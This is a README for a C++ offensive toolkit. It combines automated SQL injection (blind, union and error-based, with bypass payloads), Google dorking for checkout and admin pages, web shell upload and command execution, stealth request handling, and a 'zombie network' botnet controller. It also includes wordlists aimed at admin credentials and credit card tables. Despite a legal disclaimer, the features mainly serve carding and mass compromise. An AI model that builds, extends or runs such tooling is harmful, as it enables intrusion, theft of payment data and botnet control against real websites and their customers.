# Comprehensive Penetration Testing Framework

A powerful C++ penetration testing framework that combines SQL injection testing, Google dorking, web shell management, and zombie network capabilities. This framework translates the functionality from PHP tools like `Blind.php`, `exploit1.php`, `exploit2.php`, and `checkip.php` into a high-performance C++ application.

## Features

### 🎯 SQL Injection Testing
- **Blind SQL Injection**: Binary search algorithm for character-by-character data extraction
- **Union-based SQL Injection**: Auto-detection of column count and exploitable columns
- **Error-based SQL Injection**: Uses MySQL floor(rand(0)*2) duplicate key error technique
- **Comprehensive Wordlists**: Integrated admin/user and credit card column/table wordlists
- **Security Bypass Techniques**: Multiple comment and encoding bypass methods

### 🔍 Google Dork Search Engine
- **Automated Dorking**: Pre-defined dorks for common vulnerable patterns
- **Custom Dork Support**: Execute custom Google dork queries
- **Result Filtering**: Automatically filters out irrelevant domains
- **Rate Limiting**: Built-in delays to avoid detection

### 🌐 Web Shell Management
- **Shell Scanning**: Detect common web shells (c99, r57, b374k, wso, etc.)
- **Shell Upload**: Attempt to upload web shells to vulnerable targets
- **Command Execution**: Execute commands through discovered shells
- **Signature Detection**: Advanced shell detection patterns

### 🧟 Zombie Network Management
- **Bot Registration**: Register and track zombie bots (like checkip.php)
- **Command Broadcasting**: Send commands to all registered bots
- **Connection Monitoring**: Track online/offline bot status
- **Multi-IP Detection**: Detect multiple connections from same path

### 🛡️ Stealth Features
- **Random User Agents**: Rotates through realistic browser user agents
- **Request Delays**: Random delays between requests to avoid detection
- **Response Time Analysis**: Measures and analyzes response times
- **Error Pattern Recognition**: Advanced SQL error detection

## Installation

### Prerequisites

#### Linux/Ubuntu:
```bash
sudo apt-get update
sudo apt-get install build-essential libcurl4-openssl-dev pkg-config
```

#### CentOS/RHEL:
```bash
sudo yum install gcc-c++ libcurl-devel pkgconfig
```

#### macOS:
```bash
brew install curl
```

#### Windows (MinGW):
```bash
# Install MinGW-w64 with libcurl support
# Or use MSYS2
```

### Building

1. Clone or download the framework:
```bash
git clone [repository-url]
cd penetration-testing-framework
```

2. Run the build script:
```bash
./compile.sh
```

3. The compiled binary will be available as:
   - Linux/macOS: `./pentest_framework`
   - Windows: `./pentest_framework.exe`

## Usage

### Interactive Mode
```bash
./pentest_framework
```

The interactive mode provides a menu-driven interface:
```
=== INTERACTIVE PENETRATION TESTING MODE ===

Select option:
1. SQL Injection Test
2. Google Dorking
3. Web Shell Scan
4. Zombie Network Management
5. Full Automated Scan
6. Exit
```

### Command Line Mode
```bash
./pentest_framework http://target.com/page.php?id=1
```

### Example Outputs

#### SQL Injection Testing
```
[SQLI] Starting comprehensive SQL injection test on: http://target.com/page.php?id=1

[BLIND] Testing for blind SQL injection...
[BLIND] Vulnerable to blind SQL injection!
[BLIND] Database version: 5.7.34-0ubuntu0.18.04.1

[UNION] Testing for union-based SQL injection...
[UNION] Found 3 columns!
[UNION] Exploitable column: 2
[UNION] Found databases: information_schema test webapp 

[ERROR] Testing for error-based SQL injection...
[ERROR] Extracted via error: 5.7.34-0ubuntu0.18.04.1
```

#### Google Dorking
```
[DORK] Searching: inurl:"checkout.php"
  Found: http://shop.example.com/checkout.php
  Found: http://store.demo.com/checkout.php?step=payment

[DORK] Searching: inurl:"admin.php"
  Found: http://cms.example.com/admin.php
  Found: http://blog.demo.com/admin.php?action=login
```

#### Web Shell Scanning
```
[SHELL SCAN] Scanning for web shells on: http://target.com
  [FOUND] http://target.com/c99.php
    [CONFIRMED] Active shell detected!
  [FOUND] http://target.com/shell.php
```

## Technical Implementation

### SQL Injection Engines

#### Blind SQL Injection (`BlindSQLInjector`)
Based on `Blind.php`, implements:
- **Binary Search Algorithm**: Efficient character extraction using ASCII value comparison
- **Length Detection**: Automatically detects string length before extraction
- **Multiple Bypass Techniques**: Security, comment, and encoding bypasses
- **Error Handling**: Robust error detection and recovery

```cpp
// Example: Extract database version
std::string version = blind_injector.extractString(
    target_url, 
    "'", 
    "version()", 
    50  // max length
);
```

#### Union-based SQL Injection (`UnionSQLInjector`)
Based on `exploit1.php`, implements:
- **Column Count Detection**: Automatically finds the number of columns
- **Exploitable Column Detection**: Identifies which columns can display data
- **Database Enumeration**: Extracts database names, tables, and columns
- **GROUP_CONCAT Support**: Efficient bulk data extraction

```cpp
// Auto-detect columns and extract databases
int columns = union_injector.detectColumnCount(target_url);
int exploit_col = union_injector.findExploitableColumn(target_url, columns);
auto databases = union_injector.extractDatabases(target_url, columns, exploit_col);
```

#### Error-based SQL Injection (`ErrorSQLInjector`)
Based on `exploit2.php`, implements:
- **Floor/Rand Technique**: Uses MySQL's duplicate key error with floor(rand(0)*2)
- **Regex Pattern Matching**: Extracts data from error messages
- **Information Schema Queries**: Leverages MySQL's information_schema

### HTTP Client (`StealthHttpClient`)
- **Cross-platform Support**: Windows (WinINet) and Linux/macOS (libcurl)
- **User Agent Rotation**: Realistic browser user agents
- **Response Time Tracking**: Measures request/response times
- **Error Handling**: Comprehensive error detection and reporting

### Zombie Network (`ZombieNetworkManager`)
Based on `checkip.php` and `test.php`:
- **Bot Registration**: Track bots by IP and path
- **Session Management**: 15-minute timeout for online detection
- **Command Distribution**: Broadcast commands to all active bots
- **Statistics Tracking**: Monitor network health and bot counts

## Wordlists Integration

The framework integrates comprehensive wordlists:

### Admin/User Columns (`colomn_admin.txt`)
```
user, username, user_name, login, email, password, pwd, pass, passwd,
admin, administrator, admin_user, admin_username, admin_password,
member, members, moderator, auth, authentication
```

### Credit Card/Order Columns (`colomn_order.txt`)
```
ccnumber, ccno, ccnum, credit_card, creditcard, cc_number,
ordernumber, order_number, orderid, customer, billing, amount
```

### Admin Tables (`table_admin.txt`)
```
admin, admins, administrator, administrators, user, users,
member, members, login, logins, auth, authentication
```

### Order Tables (`table_order.txt`)
```
order, orders, purchase, purchases, payment, payments,
billing, invoice, credit_card, transaction, customer
```

## Security Bypasses

### Comment Bypasses
- `-- a`, `-- 1`, `#`, `/**/`, `/*!*/`, `/*!1337*/`

### Security Bypasses
- Basic: `And 1=1`
- Comment variants: `/*!And*/ 1=1`, `AndA 1=1`
- Union injection: Complex union select payloads

### Encoding Bypasses
- `unhex(hex({data}))`
- `CONVERT({data} USING latin1)`
- `CONVERT({data}, CHAR)`
- `CAST({data} AS CHAR)`

## Configuration

### Custom Dorks
Add custom Google dorks to the `dork_list` in `GoogleDorkSearcher`:
```cpp
dork_list = {
    "inurl:\"your_custom_path.php\"",
    "intext:\"your_pattern\" inurl:\".php?id=\"",
    // Add more custom dorks
};
```

### Web Shell Signatures
Modify `shell_signatures` in `WebShellManager`:
```cpp
shell_signatures = {
    "your_shell.php",
    "custom_backdoor.php",
    // Add more shell names
};
```

### Timing Configuration
Adjust delays in `StealthHttpClient`:
```cpp
void addDelay(int min_ms = 100, int max_ms = 2000) {
    // Customize timing here
}
```

## Advanced Usage

### Blind SQL Injection with Custom Parameters
```cpp
BlindSQLInjector blind_injector;
std::string result = blind_injector.extractString(
    "http://target.com/page.php?id=INJECT_HERE",
    "'",  // injection point
    "SELECT username FROM admin WHERE id=1",  // query
    100   // max length
);
```

### Union-based Database Enumeration
```cpp
UnionSQLInjector union_injector;
auto tables = union_injector.extractTables(
    target_url,
    column_count,
    exploit_column,
    "target_database"
);
```

### Zombie Network Commands
```cpp
ZombieNetworkManager zombie_manager;
zombie_manager.registerBot("192.168.1.100", "/bot.php", "User-Agent");
zombie_manager.broadcastCommand("collect_info", "target_data");
```

## Legal Notice

⚠️ **IMPORTANT LEGAL DISCLAIMER** ⚠️

This tool is designed for:
- **Authorized penetration testing**
- **Security research in controlled environments**
- **Educational purposes**
- **Testing your own systems**

**DO NOT USE** this tool for:
- Unauthorized access to systems you don't own
- Illegal activities
- Attacking systems without explicit permission

Always ensure you have proper authorization before testing any system. Unauthorized access to computer systems is illegal in most jurisdictions.

## Contributing

1. Fork the repository
2. Create a feature branch
3. Implement your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is provided for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations.

## Support

For issues, questions, or contributions:
- Create an issue in the repository
- Check the build.log file for compilation errors
- Ensure all dependencies are properly installed

## Changelog

### v1.0.0
- Initial release
- Blind, Union, and Error-based SQL injection
- Google Dork search engine
- Web shell management
- Zombie network capabilities
- Cross-platform support (Windows/Linux/macOS) 
